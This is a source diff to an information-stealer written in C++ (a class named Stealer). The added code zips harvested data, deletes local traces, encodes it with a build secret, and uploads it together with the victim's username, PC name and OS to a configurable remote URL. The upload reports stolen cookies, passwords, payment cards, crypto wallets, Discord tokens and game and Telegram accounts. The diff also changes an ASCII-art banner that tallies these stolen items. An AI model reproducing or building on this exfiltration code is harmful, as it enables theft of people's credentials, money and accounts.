@@ -41,7 +41,7 @@ Stealer::Stealer() {
     this->root_dir = Utils::getTemp() / Utils::generateString(10);
     fs::create_directory(this->root_dir);
 
-#if DEV
+#ifdef DEV
     std::string cmd = "explorer.exe " + this->root_dir.string();
     std::system(cmd.c_str());
 #endif
@@ -52,12 +52,67 @@ void Stealer::run() {
 }
 
 void Stealer::complete() {
+#ifndef DEV
+#ifdef BUILD_UUID
+#ifdef BUILD_SECRET
+#ifdef UPLOAD_URL
     fs::path log = this->zip_log();
     fs::remove_all(this->root_dir);
 
-    std::string cmd = "explorer.exe /select," + log.string();
-    std::system(cmd.c_str());
+    if(!exists(log))
+        return;
+
+    std::vector<unsigned char> fileBytes = FilesUtil::readBytesFromFile(log);
+    if(fileBytes.empty())
+        return;
+
+    fs::remove(log);
+
+    std::vector<unsigned char> bytes;
+
+    std::string encoded = Base64Util::b64encodeKey(fileBytes, BUILD_SECRET);
+    bytes.assign(encoded.begin(), encoded.end());
+    encoded = Base64Util::b64encode(bytes);
+
+    char acUserName[100];
+    DWORD nUserName = sizeof(acUserName);
+
+    char acPcName[100];
+    DWORD nPcName = sizeof(acUserName);
+
+    GetUserName(acUserName, &nUserName);
+    GetComputerName(acPcName, &nPcName);
+
+    json data = {
+            {"log_file", bytes},
+            {"pc_name", acPcName},
+            {"pc_username", acUserName},
+            {"os", OSUtil::getOsInfo()},
+            {"auto_fills", Counter::getAutoFills()},
+            {"bookmarks", Counter::getBookmarks()},
+            {"cards", Counter::getCards()},
+            {"cookies", Counter::getCookies()},
+            {"crypto", Counter::getCrypto()},
+            {"discord_tokens", Counter::getDiscordTokens()},
+            {"downloads", Counter::getDownloads()},
+            {"files", Counter::getFiles()},
+            {"history", Counter::getHistory()},
+            {"passwords", Counter::getPasswords()},
+            {"battlenet", Counter::isBattlenet()},
+            {"steam", Counter::isSteam()},
+            {"ubisoft_connect", Counter::isUbisoftConnect()},
+            {"minecraft", Counter::isMinecraft()},
+            {"telegram", Counter::isTelegram()}
+    };
+
+    std::string host = UPLOAD_URL;
+    HttpUtil::sentPostRequest(host + "/api/v2/uploads/log/" + BUILD_UUID, data);
+#endif
+#endif
+#endif
+#endif
 }
+
 
 void add_file_to_zip(mz_zip_archive& zip_archive, const fs::path& file_path, const fs::path& base_path) {
     std::string file_in_zip = fs::relative(file_path, base_path).string();
@@ -113,104 +168,53 @@ fs::path Stealer::zip_log() {
 
     std::stringstream comment;
 
-    comment << NAME << "™️ v" << VERSION << " - coded by .1qxz, xakerxlop with Love <3" << "\n";
-    comment << "\n";
-    comment << "⠀⡄⣿⠘⠀⠁⠛⡴⢀⠀⠀⡀⣶⣶⣴⢀          ⠀" << "\n";
-    comment << "⠀⣇⢿⠀⠀⠀⠀⠀⠋⡴⣤⣷⣿⣿⣿⣾⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀" << "\n";
-    comment << "⠀⣿⢸⠀⠀⠀⠀⠀⡆⣿⣿⣿⣿⣿⣿⣿⠺⠀⠀⠀⠀⠀⠀⠀⠀⠀" << "\n";
-    comment << "⡀⣿⠈⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⢻⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀" << "\n";
-    comment << "⡇⣿⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⢏⣠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀" << "\n";
-    comment << "⡇⢿⠀⠀⠀⠀⠀⡆⣿⣿⣿⣿⣿⣿⣾⣷⣾⢠⠀⠀⠀⠀⠀⠀⠀⠀" << "\n";
-    comment << "⡇⢸⠀⠀⠀⠀⠀⠁⣿⣿⣿⣿⣿⣿⣿⣿⣿⡾⢀⠀⠀⠀⠀⠀⠀⠀" << "\n";
-    comment << "⠀⢸⠀⠀⠀⠀⠀⡆⣿⣿⣿⣿⣿⣿⣿⣿⢹⠁⡞⢠⠀⠀⠀⠀⠀⠀" << "\n";
-    comment << "⠀⢸⠀⠀⠀⠀⠀⣷⣿⣿⣿⣿⣿⣿⣿⣿⠈⠀⠀⠟⣠⠀⠀⠀⠀⠀" << "\n";
-    comment << "⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⢻⠀⠀⠀⠀⠏⣰⠀⠀⠀⠀" << "\n";
-    comment << "⠀⠀⠀⠀⠀⠀⡆⣿⣿⣿⣿⣿⣿⣿⣿⠈⠀⠀⠀⠀⠀⠋⣴⠀⠀⠀" << "\n";
-    comment << "⠀⠀⠀⠀⠀⠀⡇⣿⣿⣿⣿⣿⣿⣿⢻⠀⠀⠀⠀⠀⠀⠀⠃⣼⠀⠀" << "\n";
-    comment << "⠀⠀⠀⠀⠀⠀⡇⣿⣿⣿⣿⣿⣿⣿⢸⠀⠀⠀⠀⠀⠀⠀⠀⠃⣼⢀" << "\n";
-    comment << "⠀⠀⠀⠀⠀⠀⣷⣿⣿⣿⣿⣿⣿⣿⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⡾" << "\n";
-    comment << "⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀" << "\n";
-    comment << "⠀⠀⠀⠀⠀⡄⣿⣿⣿⣿⣿⣿⣿⣿⣼⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀" << "\n";
-    comment << "⠀⠀⠀⠀⡀⣷⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀" << "\n";
-    comment << "⠀⠀⠀⡀⣧⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀" << "\n";
-    comment << "⠀⣄⣦⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀" << "\n";
-    comment << "⠃⠛⠿⡿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀" << "\n";
-    comment << "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠉⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀" << "\n\n";
-    comment << "╔════════════════╗" << "\n";
-    comment << "║    BROWSERS    ║" << "\n";
-    comment << "╚╦═══════════════╝" << "\n";
-    comment << " ╠═ Cookies: " << std::to_string(Counter::getCookies()) << "\n";
-    comment << " ╠═ Passwords: " << std::to_string(Counter::getPasswords()) << "\n";
-    comment << " ╠═ Auto fills: " << std::to_string(Counter::getAutoFills()) << "\n";
-    comment << " ╠═ Cards: " << std::to_string(Counter::getCards()) << "\n";
-    comment << " ╠═ Bookmarks: " << std::to_string(Counter::getBookmarks()) << "\n";
-    comment << " ╠═ Downloads: " << std::to_string(Counter::getDownloads()) << "\n";
-    comment << " ╚═ History: " << std::to_string(Counter::getHistory()) << "\n";
-    comment << "\n";
-    comment << "╔════════════════╗" << "\n";
-    comment << "║     GAMES      ║" << "\n";
-    comment << "╚╦═══════════════╝" << "\n";
-    comment << " ╠═ Battle.net: " << (Counter::isBattlenet() ? "Yes" : "No") << "\n";
-    comment << " ╠═ Ubisoft: " << (Counter::isUbisoftConnect() ? "Yes" : "No") << "\n";
-    comment << " ╠═ Minecraft: " << (Counter::isMinecraft() ? "Yes" : "No") << "\n";
-    comment << " ╚═ Steam: " << (Counter::isSteam() ? "Yes" : "No") << "\n";
-    comment << "\n";
-    comment << "╔════════════════╗" << "\n";
-    comment << "║   MESSENGERS   ║" << "\n";
-    comment << "╚╦═══════════════╝" << "\n";
-    comment << " ╠═ Telegram: " << (Counter::isTelegram() ? "Yes" : "No") << "\n";
-    comment << " ╚═ Discord tokens: " << std::to_string(Counter::getDiscordTokens()) << "\n";
-    comment << "\n";
-    comment << "╔════════════════╗" << "\n";
-    comment << "║     OTHER      ║" << "\n";
-    comment << "╚╦═══════════════╝" << "\n";
-    comment << " ╚═ Files grabbed: " << std::to_string(Counter::getFiles()) << "\n";
-    comment << "\n\n";
-    comment << R"(                   .-=====-.)" << "\n";
-    comment << R"(                   | .""". |)" << "\n";
-    comment << R"(                   | |   | |)" << "\n";
-    comment << R"(                   | |   | |)" << "\n";
-    comment << R"(                   | '---' |)" << "\n";
-    comment << R"(                   |  RIP  |)" << "\n";
-    comment << R"(                   |       |)" << "\n";
-    comment << R"(.-================-'       '-================-.)" << "\n";
-    comment << R"(|  _                                          |)" << "\n";
-    comment << R"(|.'o\                                    __   |)" << "\n";
-    comment << R"(| '-.'.                                .'o.`  |)" << "\n";
-    comment << R"('-==='.'.=========-.       .-========.'.-'===-')" << "\n";
-    comment << R"(       '.`'._    .===,     |     _.-' /)" << "\n";
-    comment << R"(         '._ '-./  ,//\   _| _.-'  _.')" << "\n";
-    comment << R"(            '-.| ,//'  \-'  `   .-')" << "\n";
-    comment << R"(               `//'_`--;    ;.-')" << "\n";
-    comment << R"(                 `\._ ;|    |)" << "\n";
-    comment << R"(                    \`-'  . |)" << "\n";
-    comment << R"(                    |_.-'-._|)" << "\n";
-    comment << R"(                    \  _'_  /)" << "\n";
-    comment << R"(                    |; -:- | )" << "\n";
-    comment << R"(                    || -.- \ )" << "\n";
-    comment << R"(                    |;     .\)" << "\n";
-    comment << R"(                    / `'\'`\-;)" << "\n";
-    comment << R"(                   ;`   '. `_/)" << "\n";
-    comment << R"(                   |,`-._;  .;)" << "\n";
-    comment << R"(                   `;\  `.-'-;)" << "\n";
-    comment << R"(                    | \   \  |)" << "\n";
-    comment << R"(                    |  `\  \ |)" << "\n";
-    comment << R"(                    |   )  | |)" << "\n";
-    comment << R"(                    |  /  /` /)" << "\n";
-    comment << R"(                    | |  /|  |)" << "\n";
-    comment << R"(                    | | / | /)" << "\n";
-    comment << R"(                    | / |/ /|)" << "\n";
-    comment << R"(                    | \ / / |)" << "\n";
-    comment << R"(                    |  /o | |)" << "\n";
-    comment << R"(                    |  |_/  |)" << "\n";
-    comment << R"(                    |       |)" << "\n";
-    comment << R"(                    |       |)" << "\n";
-    comment << R"(                    |       |)" << "\n";
-    comment << R"(                    |       |)" << "\n";
-    comment << R"(                    |       |)" << "\n";
-    comment << R"(                    |       |)" << "\n";
-    comment << R"(                    |       |)" << "\n";
-    comment << R"(                    '-=====-')";
+    comment << R"(                                                                        ▄)" << "\n";
+    comment << R"(   ▄▄▄████████████         ╓▄r  ▄▄    ,▄▄▄███▄,                       ▄███)" << "\n";
+    comment << R"(   -  ███▀                ██▀  ██▀▄▄████▀▀▀▀▀▀█▄                    ╔███▀)" << "\n";
+    comment << R"(    ╓███▀           ,   ▄██▀ ▄███████▌    ,▄████                   ▄███)" << "\n";
+    comment << R"(   ▄███▀       ▄█▄ ██  ███- ███▀ ▄███ ,▄▄███▀▀█  ,▄█⌐ ▄▄▄,   ▄▄█▄▄▄███)" << "\n";
+    comment << R"(  ▄████▄▄    ▄██████` ███  ███  ▄███▄████▀  ,   ▄██▀▄█████ ▄███▀▐████)" << "\n";
+    comment << R"(███████▀▀▀  ███▀███▌ ███ ,███  ▐███████▄   ▄██ ▄████▀ ██▀ ███▀ ▄████)" << "\n";
+    comment << R"( ████      ▐████▀██ ███  ███   ███▀    ▄█▌╒██`j███▀   █▀ ███ ▄█████)" << "\n";
+    comment << R"( ███        ███`▐█ j██` ▐██   ▐██▀   ▄███ ▐█▌ ███`       █████- ██▌)" << "\n";
+    comment << R"(███`            ╙   ▀█▀` ▀█▀  ▐█▌,▄████▀   ▀   ▀          ▀▀    ██)" << "\n";
+    comment << R"(▀█▌                         ╓▄▄█████▀                            ')" << "\n";
+    comment << R"(                             ▀▀▀        ▄▄███▀▄▄▄██w▄.      ▄▀)" << "\n";
+    comment << R"(                                       ██▀     ▄█ ▄▄  ,▄▄█ █▀▄▄, ,▄,▄▄)" << "\n";
+    comment << R"(                                        ▀▀▀▀▀▄ █ ███▌▐███╒█.████╒██▀█)" << "\n";
+    comment << R"(                                     ▄█▀   ,▄▀▐▌ █▀▀ ▀█▐▀█▌ ▀▀▀ █▀)" << "\n";
+    comment << R"(                                     ▀▀▀▀▀▀▀)" << "\n";
+    comment << R"(    ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━)" << "\n";
+    comment << R"(  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━)" << "\n";
+    comment << "       ╢█ ]█,        ╔════════════════╗" << "\n";
+    comment << "       ╢█ ]█,        ║    BROWSERS    ║" << "\n";
+    comment << "       ╢█ ]█,        ╚╦═══════════════╝" << "\n";
+    comment << "       ╢█ ]█.         ╠═ Cookies: " << std::to_string(Counter::getCookies()) << "\n";
+    comment << "     @▓╣█ }╙██@       ╠═ Passwords: " << std::to_string(Counter::getPasswords()) << "\n";
+    comment << "     ▓╫▀▒▒▌▐╢µ╠█      ╠═ Auto fills: " << std::to_string(Counter::getAutoFills()) << "\n";
+    comment << "    j╫█▓H╚▀╣╝▐▓█      ╠═ Cards: " << std::to_string(Counter::getCards()) << "\n";
+    comment << "    j╫█¬     ╞╫█      ╠═ Bookmarks: " << std::to_string(Counter::getBookmarks()) << "\n";
+    comment << "    j╫█¬     ╞╫█      ╠═ Downloads: " << std::to_string(Counter::getDownloads()) << "\n";
+    comment << "    j╫█¬     ╞╫█      ╚═ History: " << std::to_string(Counter::getHistory()) << "\n";
+    comment << "    j╫█¬     ╞╫█      \n";
+    comment << "     ██╣╢█▓╣▓╣█      ╔════════════════╗" << "\n";
+    comment << "     ╙▒▀╫█▌▐▀▓█      ║     GAMES      ║" << "\n";
+    comment << "      ╙╢█ |▓▀▀       ╚╦═══════════════╝" << "\n";
+    comment << "       ╢█ ╘▓          ╠═ Battle.net: " << (Counter::isBattlenet() ? "Yes" : "No") << "\n";
+    comment << "       ╢█ ╘▓          ╠═ Ubisoft: " << (Counter::isUbisoftConnect() ? "Yes" : "No") << "\n";
+    comment << "       ╢█ ╘▓          ╠═ Minecraft: " << (Counter::isMinecraft() ? "Yes" : "No") << "\n";
+    comment << "       ╢█ ╘▓          ╚═ Steam: " << (Counter::isSteam() ? "Yes" : "No") << "\n";
+    comment << "     @▓╣█ }╙██@       \n";
+    comment << "     ▓╫▀▒▒▌▐╢µ╠█     ╔════════════════╗" << "\n";
+    comment << "    j╫█▓H╚▀╣╝▐▓█     ║   MESSENGERS   ║" << "\n";
+    comment << "    j╫█¬     ╞╫█     ╚╦═══════════════╝" << "\n";
+    comment << "    j╫█¬     ╞╫█      ╠═ Telegram: " << (Counter::isTelegram() ? "Yes" : "No") << "\n";
+    comment << "    j╫█¬     ╞╫█      ╚═ Discord tokens: " << std::to_string(Counter::getDiscordTokens()) << "\n";
+    comment << "     ██╣╢█▓╣▓╣█        \n";
+    comment << "     ╙▒▀╫█▌▐▀▓█      ╔════════════════╗" << "\n";
+    comment << "      ╙╢█ |▓▀▀       ║     OTHER      ║" << "\n";
+    comment << "       ╢█ ╘▓         ╚╦═══════════════╝" << "\n";
+    comment << "       ╢█ ╘▓          ╚═ Files grabbed: " << std::to_string(Counter::getFiles()) << "\n";
 
     if (!mz_zip_writer_finalize_archive(&zip_archive)) {
         mz_zip_writer_end(&zip_archive);
